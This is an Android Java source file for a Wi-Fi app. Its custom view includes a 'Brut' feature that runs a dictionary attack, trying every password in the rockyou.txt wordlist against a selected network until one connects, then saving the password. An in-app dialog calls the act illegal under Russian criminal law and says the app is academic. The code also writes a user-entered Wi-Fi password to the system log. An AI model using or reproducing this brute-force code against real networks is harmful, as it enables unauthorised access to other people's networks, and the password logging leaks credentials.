package com.example.wifitasksecondtime;
import android.app.Dialog;
import android.app.ProgressDialog;
import android.content.Context;
import android.content.DialogInterface;
import android.content.res.Resources;
import android.os.AsyncTask;
import android.util.AttributeSet;
import android.util.Log;
import android.view.LayoutInflater;
import android.view.View;
import android.view.ViewGroup;
import android.widget.EditText;
import android.widget.ImageView;
import android.widget.TextView;
import androidx.appcompat.app.AlertDialog;
import androidx.appcompat.widget.AppCompatButton;
import androidx.constraintlayout.widget.ConstraintLayout;

import com.example.wifitasksecondtime.ui.home.MainFragment;

import java.io.IOException;
import java.io.InputStream;
import java.util.Scanner;

public class SimpleElementWiFi extends ConstraintLayout {
    private BrutTask brutTask_;

    private AppCompatButton brut_;

    private AppCompatButton connect_;

    private Context context_;

    int countView_ = 5;

    private ImageView icon_;

    private AppCompatButton info_;

    private TextView name_;

    private TextView password_;

    private WiFiInfo wiFiInfo_;

    public SimpleElementWiFi(Context Context) {
        super(Context);
        initView(Context);
    }

    public SimpleElementWiFi(Context Context, AttributeSet AttributeSet) {
        super(Context, AttributeSet);
        initView(Context);
    }

    public SimpleElementWiFi(Context Context, AttributeSet AttributeSet, int Int) {
        super(Context, AttributeSet, Int);
        initView(Context);
    }

    private void ChangeSizeView(View View, int Int1, int Int2) {
        ViewGroup.LayoutParams layouts = View.getLayoutParams();
        layouts.width = Int2;
        layouts.height = Int1;
        View.setLayoutParams(layouts);
    }

    private void ChangeSizeWithDisplay() {
        int height = (Resources.getSystem().getDisplayMetrics()).widthPixels / countView_;
        int width = height / 20;
        ChangeSizeView((View) icon_, height, height);
        ChangeSizeView((View) name_, height / 2, height);
        name_.setTextSize(width);
        ChangeSizeView((View) password_, height / 2, height);
        password_.setTextSize(width);
        ChangeSizeView((View) info_, height, height);
        info_.setTextSize(width);
        ChangeSizeView((View) brut_, height, height);
        brut_.setTextSize(width);
        ChangeSizeView((View) connect_, height, height);
        connect_.setTextSize(width);
    }

    private Dialog CreateBrutDialog(final Context context) {
        AlertDialog.Builder builder = new AlertDialog.Builder(context);
        MainFragment.setUpdate(false);
        builder.setCancelable(false).setNegativeButton("Отмена", new DialogInterface.OnClickListener() {
            public void onClick(DialogInterface DialogInterface, int Int) {
                MainFragment.setUpdate(true);
                DialogInterface.cancel();
            }
        }).setPositiveButton("Брут", new DialogInterface.OnClickListener() {
            public void onClick(DialogInterface DialogInterface, int Int) {
                ProgressDialog progressDialog = CreateProgressBrutDialog(context);
                brutTask_ = new BrutTask(progressDialog);
                brutTask_.SetWorking(true);
                brutTask_.execute();
            }
        }).setMessage("Данное деяние нарушает законы Российской Федерации.\n" +
                "Преследуется по уголовному кодексу:" +
                "Статья 272 УК РФ: Неправомерный доступ к компьютерной информации + \n" +
                "Статья 273 УК РФ: Создание, использование и распространение вредоносных программ + \n" +
                "Данное приложение было создано в академических целях.");
        return builder.create();
    }

    private Dialog CreateConnectDialog(Context Context, String String) {
        AlertDialog.Builder builder = new AlertDialog.Builder(Context);
        
        final EditText editText = new EditText(Context);
        
        editText.setText(password_.getText());
        
        builder.setCancelable(false).setNegativeButton("Отмена", new DialogInterface.OnClickListener() {
            public void onClick(DialogInterface DialogInterface, int Int) {
                DialogInterface.cancel();
            }
        }).setPositiveButton("Подключиться", new DialogInterface.OnClickListener() {
            public void onClick(DialogInterface DialogInterface, int Int) {
                String str;
                MainFragment.setUpdate(false);
                if (ConnectToWiFi.tryConnectWiFi(wiFiInfo_, String.valueOf(editText.getText()))) {
                    str = "Подключено";
                    
                    wiFiInfo_.Password = String.valueOf(editText.getText());
                    password_.setText((CharSequence) editText.getText());
                    DatabaseWifi.update(wiFiInfo_);
                    
                    Log.e("Tag", wiFiInfo_.Password);
                } else {
                    str = "Отклонено";
                    password_.setText("");
                }
                DialogInterface.cancel();
                CreateInfoDialog(context_, str).show();
                MainFragment.setUpdate(true);
            }
        }).setView((View) editText).setMessage(String);
        return (Dialog) builder.create();
    }

    private Dialog CreateInfoDialog(Context Context, String String) {
        AlertDialog.Builder builder = new AlertDialog.Builder(Context);
        builder.setCancelable(false).setPositiveButton("Принято", new DialogInterface.OnClickListener() {
            public void onClick(DialogInterface DialogInterface, int Int) {
                DialogInterface.cancel();
            }
        }).setMessage(String);
        return (Dialog) builder.create();
    }

    private ProgressDialog CreateProgressBrutDialog(Context Context) {
        ProgressDialog progressDialog = new ProgressDialog(Context);
        progressDialog.setButton(DialogInterface.BUTTON_NEGATIVE, "Отмена", new DialogInterface.OnClickListener() {
            public void onClick(DialogInterface DialogInterface, int Int) {
                MainFragment.setUpdate(true);
                brutTask_.SetWorking(false);
                DialogInterface.cancel();
            }
        });
        progressDialog.setProgressStyle(ProgressDialog.STYLE_HORIZONTAL);
        return progressDialog;
    }

    private void initView(Context Context) {
        context_ = Context;
        ((LayoutInflater) getContext().getSystemService(Context.LAYOUT_INFLATER_SERVICE)).
                inflate(R.layout.simple_element, this, true);
        Log.e("YES", "YES");
        icon_ = (ImageView) findViewById(R.id.icon);
        name_ = (TextView) findViewById(R.id.name);
        password_ = (TextView) findViewById(R.id.password);
        info_ = (AppCompatButton) findViewById(R.id.info);
        brut_ = (AppCompatButton) findViewById(R.id.brut);
        connect_ = (AppCompatButton) findViewById(R.id.connect);
    }

    public void ChangeElementWithWifiInfo(WiFiInfo WiFiInfo) {
        ChangeSizeWithDisplay();
        name_.setText(WiFiInfo.SSID);
        switch (WiFiInfo.Level) {
            default:
                icon_.setImageResource(R.drawable.wifi_nope);
                break;
            case 5:
                icon_.setImageResource(R.drawable.wifi_five);
                break;
            case 4:
                icon_.setImageResource(R.drawable.wifi_four);
                break;
            case 3:
                icon_.setImageResource(R.drawable.wifi_three);
                break;
            case 2:
                icon_.setImageResource(R.drawable.wifi_two);
                break;
            case 1:
                icon_.setImageResource(R.drawable.wifi_one);
                break;
            case 0:
                icon_.setImageResource(R.drawable.wifi_zero);
                break;
        }
        password_.setText(wiFiInfo_.Password);
        info_.setOnClickListener(new View.OnClickListener() {
            public void onClick(View View) {

                CreateInfoDialog(
                        context_,
                        wiFiInfo_.toString())
                        .show();
            }
        });
        connect_.setOnClickListener(new View.OnClickListener() {
            public void onClick(View View) {

                CreateConnectDialog(
                        context_,
                        "Введите пароль")
                        .show();
            }
        });
        brut_.setOnClickListener(new View.OnClickListener() {
            public void onClick(View View) {
                ;
                CreateBrutDialog(context_)
                        .show();
            }
        });
    }

    public AppCompatButton getBrut() {
        return brut_;
    }

    public ImageView getIcon() {
        return icon_;
    }

    public AppCompatButton getInfo() {
        return info_;
    }

    public TextView getName() {
        return name_;
    }

    public TextView getPassword() {
        return password_;
    }

    public WiFiInfo getWiFiInfo() {
        return wiFiInfo_;
    }

    protected void onFinishInflate() {
        super.onFinishInflate();
    }

    public void setBrut(AppCompatButton AppCompatButton) {
        brut_ = AppCompatButton;
    }

    public void setIcon(ImageView ImageView) {
        icon_ = ImageView;
    }

    public void setInfo(AppCompatButton AppCompatButton) {
        info_ = AppCompatButton;
    }

    public void setName(TextView TextView) {
        name_ = TextView;
    }

    public void setPassword(TextView TextView) {
        password_ = TextView;
    }

    public void setWiFiInfo(WiFiInfo WiFiInfo) {
        wiFiInfo_ = WiFiInfo;
        ChangeElementWithWifiInfo(WiFiInfo);
    }

    class BrutTask extends AsyncTask<Void, String, String> {
        private InputStream inputStream_;

        private ProgressDialog progressDialog_;

        private boolean working_;

        public BrutTask(ProgressDialog ProgressDialog) {
            progressDialog_ = ProgressDialog;
            ProgressDialog.setMax(139921262);
            progressDialog_.setProgress(0);
            progressDialog_.setMessage("0");
            progressDialog_.setIndeterminate(false);
            working_ = true;
        }

        private int getCountWords(InputStream InputStream) {
            Scanner scanner = new Scanner(InputStream);
            int i;
            for (i = 0; scanner.hasNextLine(); i += (scanner.nextLine().split(" ")).length) ;
            scanner.close();
            return i;
        }

        public void SetWorking(boolean Boolean) {
            working_ = Boolean;
        }

        protected String doInBackground(Void... VarArgs) {
            Scanner scanner = new Scanner(inputStream_);
            while (scanner.hasNextLine() && working_) {
                String[] arrayOfString = scanner.nextLine().split(" ");
                for (int i = 0; i < arrayOfString.length; i++) {
                    publishProgress(new String[]{arrayOfString[i]});
                    if (ConnectToWiFi.tryConnectWiFi(wiFiInfo_, arrayOfString[i])) {
                        password_.setText(arrayOfString[i]);
                        return arrayOfString[i];
                    }
                }
            }
            scanner.close();
            return "pass_no_";
        }

        protected void onPostExecute(String String) {
            super.onPostExecute(String);
            try {
                inputStream_.close();
                if (!"pass_no_".equals(String)) {
                    password_.setText(String);
                    wiFiInfo_.Password = String;
                    DatabaseWifi.update(wiFiInfo_);
                }
                return;
            } catch (IOException iOException) {
                throw new RuntimeException(iOException);
            }
        }

        protected void onPreExecute() {
            super.onPreExecute();
            try {
                inputStream_ = MainActivity.getContext_().getApplicationContext().getAssets().open("rockyou.txt");
                progressDialog_.show();
                return;
            } catch (IOException iOException) {
                throw new RuntimeException(iOException);
            }
        }

        protected void onProgressUpdate(String... VarArgs) {
            super.onProgressUpdate(VarArgs);
            progressDialog_.setProgress(progressDialog_.getProgress() + 1);
            progressDialog_.setMessage(VarArgs[0]);
        }
    }
}

